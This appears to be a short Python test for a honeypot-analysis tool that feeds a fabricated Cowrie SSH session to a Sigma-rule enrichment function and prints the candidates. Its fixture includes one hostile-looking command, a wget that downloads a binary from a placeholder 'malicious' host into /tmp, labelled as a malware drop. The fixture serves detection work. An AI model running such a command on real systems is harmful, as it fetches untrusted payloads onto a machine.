# tests/rag_sigma_test.py

from ai.rag.sigma_query import enrich_session_with_sigma

test = {
    "session_id": "x",
    "sensor": "Cowrie",
    "attack_intent": "malware_drop",
    "summary": "Attacker downloaded a suspicious ELF binary via wget.",
    "key_indicators": {
        "src_ip": "1.2.3.4",
        "dest_ip": "10.20.20.10",
        "src_ports": [44444],
        "dest_ports": [22],
        "protocols": ["ssh"],
        "commands": ["wget http://malicious/file.bin -O /tmp/x"],
        "urls": ["http://malicious/file.bin"],
        "signatures": [],
        "files": ["/tmp/x"],
    },
    "confidence": 0.9,
    "risk_score": 7,
    "timestamp_range": {"start": "2025-09-01", "end": "2025-09-01"},
}

res = enrich_session_with_sigma(test, top_k=5)

print("Number of Sigma candidates:", len(res["sigma_candidates"]))
for cand in res["sigma_candidates"]:
    print(cand)
